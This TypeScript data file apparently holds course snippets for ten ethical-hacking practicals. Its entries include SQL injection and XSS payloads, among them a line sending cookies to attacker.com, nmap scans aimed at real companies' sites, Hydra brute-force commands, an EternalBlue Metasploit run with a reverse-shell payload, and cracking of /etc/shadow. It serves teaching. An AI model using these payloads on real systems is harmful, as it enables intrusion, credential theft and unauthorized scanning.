export interface SnippetSection {
  title: string;
  code: string;
}

export interface Snippet {
  id: string;
  title: string;
  description: string;
  language: string;
  code: string;
  sections?: SnippetSection[];
  tags: string[];
}

export const snippets: Snippet[] = [
  {
    id: "prac-1",
    title: "Prac 1: Footprinting (Google Dorks)",
    description: "Advanced search techniques for information gathering and reconnaissance using Google Search operators.",
    language: "markdown",
    tags: ["recon", "footprinting", "google-dorks", "information-gathering"],
    code: `# 01. Display Facebook page of ruia csit
inurl:facebook intext:ruia csit

# 02. Display python programs in PDF format from tutorialspoint
inurl:tutorialspoint intext:python filetype:pdf

# 03. Display the images related to covid-19
intitle:"covid-19" filetype: jpg

# 04. Display all video and audio files related to nasa
intext:"nasa" filetype: mp4 || mp3

# 05. Display today's weather of Poland
weather:Poland

# 06. Display financial budget of 2024-25 in excel format
filetype:xlsx financial budget 2024-25

# 07. Display the route from mumbai to goa
map:mumbai to goa

# 08. Find the white paper for bitcoin
intitle:Bitcoin filetype:pdf

# 09. Display the PM oath ceremony of 2024
intitle:PM oath ceremony

# 10. Display the ATKT timetable of Ruia College
site:ruiacollege.edu intext:ATKT timetable


Traceroute-
tracert google.com


`,


  },
  {
    id: "prac-2",
    title: "Prac 2: Network Scanning tools(NMAP)",
    description: "Specific Nmap commands for target scanning, port ranges, exclusion, and advanced scan types (SYN, ACK, FIN, NULL, XMAS).",
    language: "bash",
    tags: ["nmap", "scanning", "network-security"],
    code: `1) nmap www.google.com
2) nmap www.ruiacollege.edu

Q. scan the ports in specific range of target
1. nmap -p 1-100 www.google.com
2. nmap -p 1-100 aws.amazon.com

Q. scan a specific port on target machine
Command: nmap -p 80 www.google.com

Q. scan the ports by excluding the specific port
Command: nmap www.google.com --exclude-ports 1-100

ACK Scan = Command: nmap -sA -T4 nmap.org
SYN Scan = nmap -sS -T4 caldera.com
A FIN scan = nmap -sF -T4 acer.com
A NULL scan = nmap -sN -T4 hp.com
Q. XMAS Scan = nmap -sX -T4 hp.com`,
  },
  {
    id: "prac-3",
    title: "Prac 3: Enumeration tools NetBIOS",
    description: "NetBIOS enumeration and network statistics commands for identifying network resources.",
    language: "bash",
    tags: ["enumeration", "netbios", "network-security"],
    code: `IP Range: 192.168.2.1-192.168.2.254

# Note: Run the following command as Administrator
netstat -help`,
  },
  {
    id: "prac-4",
    title: "Prac 4: SQL Injection (SQLi)",
    description: "Common SQL injection payloads and testing techniques for database vulnerabilities.",
    language: "sql",
    tags: ["exploitation", "sqli", "database", "web-security"],
    code: `-- Authentication Bypass
' OR '1'='1' --
" OR "1"="1" --
admin' --

-- Union Based SQLi (finding columns)
' UNION SELECT 1,2,3,4 --

-- Database Version Fingerprinting
' UNION SELECT @@version, NULL --

-- Extracting Table Names (MySQL)
' UNION SELECT table_name, NULL FROM information_schema.tables --`,
  },
  {
    id: "prac-5",
    title: "Prac 5: Cross-Site Scripting (XSS)",
    description: "Payloads for testing Reflected, Stored, and DOM-based XSS vulnerabilities.",
    language: "html",
    tags: ["xss", "web-security", "javascript"],
    code: `<!-- Standard Alert Payload -->
<script>alert('XSS')</script>

<!-- Using image source for bypass -->
<img src=x onerror=alert(1)>

<!-- Cookie Stealing (PoC) -->
<script>new Image().src="http://attacker.com/log?c="+document.cookie;</script>

<!-- SVG Payload -->
<svg onload=alert(1)>`,
  },
  {
    id: "prac-6",
    title: "Prac 6: Password Cracking (Hydra)",
    description: "Brute-force login credentials for various protocols like SSH, FTP, and HTTP.",
    language: "bash",
    tags: ["bruteforce", "hydra", "passwords"],
    code: `# Crack SSH with a username and a wordlist
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh

# Crack FTP with a list of users and passwords
hydra -L users.txt -P passwords.txt ftp://192.168.1.1

# Web Login Form (POST)
hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"`,
  },
  {
    id: "prac-7",
    title: "Prac 7: Banner Grabbing & Service Detection",
    description: "Techniques to identify service versions and software running on open ports.",
    language: "bash",
    tags: ["recon", "banner-grabbing", "netcat"],
    code: `# Using Netcat for banner grabbing
nc -v 192.168.1.1 80
HEAD / HTTP/1.0

# Using Telnet
telnet 192.168.1.1 21

# Using Curl to see HTTP headers
curl -I http://example.com`,
  },
  {
    id: "prac-8",
    title: "Prac 8: Python Scapy for Packet Sniffing",
    description: "Basic packet sniffing and analysis using the Scapy library in Python.",
    language: "python",
    tags: ["python", "scapy", "sniffing", "network"],
    code: `from scapy.all import sniff, IP, TCP

def packet_callback(packet):
    if packet.haslayer(IP):
        ip_layer = packet.getlayer(IP)
        print(f"New Packet: {ip_layer.src} -> {ip_layer.dst}")

# Sniff 10 packets
sniff(filter="ip", prn=packet_callback, count=10)`,
  },
  {
    id: "prac-9",
    title: "Prac 9: Metasploit Framework (MSF)",
    description: "Introduction to basic Metasploit commands for exploit search and execution.",
    language: "bash",
    tags: ["metasploit", "exploitation", "framework"],
    code: `# Start metasploit console
msfconsole

# Search for an exploit
search eternalblue

# Use a specific exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set target and payload
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10

# Execute exploit
exploit`,
  },
  {
    id: "prac-10",
    title: "Prac 10: Hash Cracking (John the Ripper)",
    description: "Offline password cracking for various hash types like MD5, SHA1, and Linux shadow files.",
    language: "bash",
    tags: ["john", "hashing", "passwords"],
    code: `# Crack a simple MD5 hash
echo "5d41402abc4b2a76b9719d911017c592" > hash.txt
john --format=raw-md5 hash.txt

# Crack Linux shadow file
sudo unshadow /etc/passwd /etc/shadow > myhashes.txt
john myhashes.txt

# View cracked passwords
john --show myhashes.txt`,
  },
];
